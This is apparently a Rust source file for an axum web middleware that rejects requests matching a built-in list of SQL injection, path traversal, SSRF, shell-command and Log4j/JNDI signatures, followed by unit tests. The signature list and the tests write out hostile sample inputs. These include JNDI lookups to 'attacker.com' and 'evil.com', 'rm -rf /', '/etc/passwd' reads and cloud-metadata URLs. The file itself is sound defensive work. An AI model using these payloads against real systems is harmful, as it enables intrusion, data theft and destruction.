use axum::{
    body::Body,
    http::{HeaderMap, Request, Response, StatusCode},
    response::IntoResponse,
};
use std::{
    future::Future,
    pin::Pin,
    task::{Context, Poll},
};
use tower::{Layer, Service};

/// RASP (Runtime Application Self-Protection) Inspector.
/// Analyzes request telemetry in zero-latency to block SQLi, Path Traversal, SSRF, RCE, and JNDI exploits.
static ATTACK_PATTERNS: &[&str] = &[
    // SQL Injection
    "union select",
    "union%20select",
    "union+select",
    "' or '1'='1",
    "%27%20or%20%271%27=%271",
    "; drop table",
    ";%20drop%20table",
    "sleep(",
    "benchmark(",
    "extractvalue(",
    "information_schema",
    // Path Traversal
    "../",
    "..\\",
    "%2e%2e/",
    "%2e%2e%2f",
    "/etc/passwd",
    "c:\\windows\\system32",
    // SSRF
    "169.254.169.254",
    "metadata.google.internal",
    "127.0.0.1:2375",
    // RCE & Shell Injection
    "; cat ",
    "| sh",
    "; rm -rf",
    "powershell",
    "cmd.exe",
    "/bin/bash",
    "/bin/sh",
    // Log4j / JNDI
    "${jndi:",
    "${ldap:",
    "${rmi:",
    "${dns:",
];

#[inline]
fn contains_ignore_ascii_case(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return true;
    }
    let h_bytes = haystack.as_bytes();
    let n_bytes = needle.as_bytes();
    if h_bytes.len() < n_bytes.len() {
        return false;
    }

    h_bytes.windows(n_bytes.len()).any(|window| {
        window
            .iter()
            .zip(n_bytes.iter())
            .all(|(&h, &n)| h.eq_ignore_ascii_case(&n))
    })
}

pub struct RaspInspector;

impl RaspInspector {
    /// Deep inspection of a generic text payload for attack signatures with zero heap allocations.
    pub fn inspect_text(payload: &str) -> bool {
        for &pattern in ATTACK_PATTERNS {
            if contains_ignore_ascii_case(payload, pattern) {
                return true;
            }
        }
        false
    }

    /// Inspects an incoming request target URI and query string for attack patterns.
    pub fn inspect_uri(uri: &str) -> bool {
        Self::inspect_text(uri)
    }

    /// Inspects HTTP headers (User-Agent, Referer, Custom Headers) for injected attack payloads.
    pub fn inspect_headers(headers: &HeaderMap) -> bool {
        for (name, val) in headers {
            if name == "cookie" || name == "authorization" {
                continue;
            }
            if let Ok(v_str) = val.to_str()
                && Self::inspect_text(v_str)
            {
                return true;
            }
        }
        false
    }
}

/// Tower Layer for RASP Runtime Application Self-Protection middleware.
#[derive(Clone, Default)]
pub struct RaspSecurityLayer;

impl<S> Layer<S> for RaspSecurityLayer {
    type Service = RaspSecurityService<S>;

    fn layer(&self, inner: S) -> Self::Service {
        RaspSecurityService { inner }
    }
}

/// Tower Service for RASP middleware.
#[derive(Clone)]
pub struct RaspSecurityService<S> {
    inner: S,
}

impl<S> Service<Request<Body>> for RaspSecurityService<S>
where
    S: Service<Request<Body>, Response = Response<Body>> + Clone + Send + 'static,
    S::Future: Send + 'static,
{
    type Response = Response<Body>;
    type Error = S::Error;
    type Future = Pin<Box<dyn Future<Output = Result<Self::Response, Self::Error>> + Send>>;

    fn poll_ready(&mut self, cx: &mut Context<'_>) -> Poll<Result<(), Self::Error>> {
        self.inner.poll_ready(cx)
    }

    fn call(&mut self, req: Request<Body>) -> Self::Future {
        let uri_str = req.uri().to_string();
        let headers_bad = RaspInspector::inspect_headers(req.headers());
        let uri_bad = RaspInspector::inspect_uri(&uri_str);

        if uri_bad || headers_bad {
            let store = crate::telemetry::SecurityStore::global();
            if let Ok(mut events) = store.live_events.lock() {
                events.insert(
                    0,
                    crate::telemetry::LiveSecurityEvent {
                        event_type: "RASP_PAYLOAD_INTERCEPTED".to_string(),
                        details: format!(
                            "Intercepted malicious payload (URI: {}, Headers Violation: {})",
                            uri_str, headers_bad
                        ),
                        client_ip: "127.0.0.1".to_string(),
                        timestamp_str: crate::telemetry::current_timestamp_str(),
                        verified_hmac: true,
                    },
                );
            }
            let res = (
                StatusCode::FORBIDDEN,
                "🛡️ RASP Security Violation: Malicious payload intercepted.",
            )
                .into_response();
            return Box::pin(async move { Ok(res) });
        }

        let mut inner = self.inner.clone();
        Box::pin(async move { inner.call(req).await })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::http::HeaderValue;

    #[test]
    fn test_rasp_sqli_detection() {
        assert!(RaspInspector::inspect_uri(
            "/api/users?q=UNION SELECT * FROM passwords"
        ));
        assert!(RaspInspector::inspect_uri("/login?user=admin' OR '1'='1"));
        assert!(RaspInspector::inspect_text(
            "SELECT * FROM users WHERE id = 1; SLEEP(5);"
        ));
        assert!(!RaspInspector::inspect_uri("/api/users?id=123"));
    }

    #[test]
    fn test_rasp_path_traversal_detection() {
        assert!(RaspInspector::inspect_uri(
            "/download?file=../../etc/passwd"
        ));
        assert!(!RaspInspector::inspect_uri("/download?file=document.pdf"));
    }

    #[test]
    fn test_rasp_jndi_detection() {
        assert!(RaspInspector::inspect_text(
            "${jndi:ldap://attacker.com/exploit}"
        ));
        assert!(RaspInspector::inspect_text("${rmi://evil.com:1099/obj}"));
    }

    #[test]
    fn test_rasp_header_inspection() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "user-agent",
            HeaderValue::from_static("${jndi:ldap://evil.com/a}"),
        );
        assert!(RaspInspector::inspect_headers(&headers));

        let mut clean_headers = HeaderMap::new();
        clean_headers.insert("user-agent", HeaderValue::from_static("Mozilla/5.0"));
        assert!(!RaspInspector::inspect_headers(&clean_headers));
    }

    #[test]
    fn test_rasp_ssrf_and_rce_detection() {
        // SSRF
        assert!(RaspInspector::inspect_uri(
            "/proxy?url=http://169.254.169.254/latest/meta-data"
        ));
        assert!(RaspInspector::inspect_uri(
            "/fetch?url=http://metadata.google.internal/computeMetadata"
        ));

        // RCE
        assert!(RaspInspector::inspect_text("input; rm -rf /"));
        assert!(RaspInspector::inspect_text("echo test | sh"));
        assert!(RaspInspector::inspect_text(
            "powershell -Command Invoke-WebRequest"
        ));
        assert!(RaspInspector::inspect_text("run /bin/bash script.sh"));
    }

    #[tokio::test]
    async fn test_rasp_security_layer_middleware() {
        use axum::routing::get;
        use tower::ServiceExt;

        async fn handler() -> impl IntoResponse {
            (StatusCode::OK, "Protected Resource")
        }

        let app = axum::Router::new()
            .route("/items", get(handler))
            .layer(RaspSecurityLayer);

        // Attack request -> Blocked with 403
        let attack_req = Request::builder()
            .uri("/items?q=UNION%20SELECT%20password%20FROM%20users")
            .body(Body::empty())
            .unwrap();

        let attack_resp = app.clone().oneshot(attack_req).await.unwrap();
        assert_eq!(attack_resp.status(), StatusCode::FORBIDDEN);

        // Clean request -> 200 OK
        let clean_req = Request::builder()
            .uri("/items?page=1")
            .body(Body::empty())
            .unwrap();

        let clean_resp = app.oneshot(clean_req).await.unwrap();
        assert_eq!(clean_resp.status(), StatusCode::OK);
    }
}

#[cfg(kani)]
#[cfg_attr(mutants, mutants::skip)]
mod kani_proofs {
    use super::*;

    #[kani::proof]
    fn proof_rasp_clean_uri() {
        assert!(!RaspInspector::inspect_uri("/clean/path"));
    }
}
